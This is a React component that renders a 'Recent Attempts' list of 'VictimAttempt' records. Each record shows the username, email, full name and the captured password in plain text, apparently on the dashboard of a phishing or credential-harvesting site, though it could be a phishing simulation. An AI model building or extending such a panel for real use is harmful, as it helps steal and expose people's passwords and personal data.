import React from 'react';
import { Card } from '../ui/Card';
import { VictimAttempt } from '../../types/database';
import { Clock, User, Mail, Shield } from 'lucide-react';

interface RecentAttemptsProps {
  attempts: VictimAttempt[];
}

export const RecentAttempts: React.FC<RecentAttemptsProps> = ({ attempts }) => {
  const recentAttempts = attempts.slice(0, 10);

  const formatTime = (timestamp: string) => {
    const date = new Date(timestamp);
    return date.toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const truncateText = (text: string | null, maxLength: number) => {
    if (!text) return 'N/A';
    return text.length > maxLength ? `${text.substring(0, maxLength)}...` : text;
  };

  return (
    <Card>
      <h3 className="text-lg font-semibold text-gray-900 mb-4">Recent Attempts</h3>
      <div className="space-y-3 max-h-96 overflow-y-auto">
        {recentAttempts.map((attempt) => (
          <div key={attempt.id} className="border border-gray-200 rounded-lg p-4 hover:bg-gray-50 transition-colors">
            <div className="flex items-start justify-between">
              <div className="flex-1 space-y-2">
                <div className="flex items-center gap-2">
                  <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                    attempt.attempt_type === 'login' 
                      ? 'bg-blue-100 text-blue-800' 
                      : 'bg-green-100 text-green-800'
                  }`}>
                    {attempt.attempt_type.toUpperCase()}
                  </span>
                  <span className="text-sm text-gray-500 flex items-center gap-1">
                    <Clock size={12} />
                    {formatTime(attempt.created_at)}
                  </span>
                </div>
                
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div className="flex items-center gap-2">
                    <User size={14} className="text-gray-400" />
                    <span className="text-gray-700">
                      {truncateText(attempt.username, 15)}
                    </span>
                  </div>
                  
                  {attempt.email && (
                    <div className="flex items-center gap-2">
                      <Mail size={14} className="text-gray-400" />
                      <span className="text-gray-700">
                        {truncateText(attempt.email, 20)}
                      </span>
                    </div>
                  )}
                  
                  <div className="flex items-center gap-2">
                    <Shield size={14} className="text-gray-400" />
                    <span className="text-gray-700 font-mono">
                      {truncateText(attempt.password, 10)}
                    </span>
                  </div>
                  
                  {attempt.full_name && (
                    <div className="text-gray-700">
                      Name: {truncateText(attempt.full_name, 15)}
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        ))}
        
        {recentAttempts.length === 0 && (
          <div className="text-center py-8 text-gray-500">
            No attempts recorded yet
          </div>
        )}
      </div>
    </Card>
  );
};